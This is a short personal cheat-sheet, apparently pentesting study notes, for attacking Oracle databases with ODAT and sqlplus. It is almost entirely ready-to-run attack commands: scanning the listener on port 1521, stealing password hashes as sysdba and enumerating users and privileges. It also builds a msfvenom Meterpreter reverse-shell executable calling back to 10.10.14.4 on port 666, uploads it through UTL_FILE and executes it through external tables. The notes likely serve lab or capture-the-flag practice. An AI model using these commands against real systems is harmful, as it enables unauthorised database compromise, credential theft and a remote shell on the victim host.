---
title: Odat / Sqlplus
updated: 2023-11-16 03:00:16Z
created: 2023-11-15 00:43:44Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

### Use ODAT to scan the database
`odat all -s <targetIP> -p 1521`

### Once you have a username/password, rescan with and without --sysdba

`odat all -s <targetIP> -d XE -U username -P password --sysdba`

```
odat passwordstealer -s <targetIP> -d XE -U username -P password --sysdba --get-passwords
```

### Connect with sqlplus:
`sqlplus user/password@target:1521/XE`

`sqlplus user/password@target:1521/XE as sysdba`

`SELECT username FROM all_users ORDER BY username;`

`SELECT * FROM all_users ORDER BY created;`

`SELECT * from user_role_privs;`

***

# Upload a file (shell)
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=666 -f exe -o 666shell.exe`
`odat utlfile -s <targetIP> -U username -P password -d XE --sysdba --putFile \\temp 666shell.exe ~/scripts/666shell.exe`

**Execute the shell:**
`odat externaltable -s <targetIP> -U username -P password -d XE --sysdba --exec \\temp 666shell.exe`
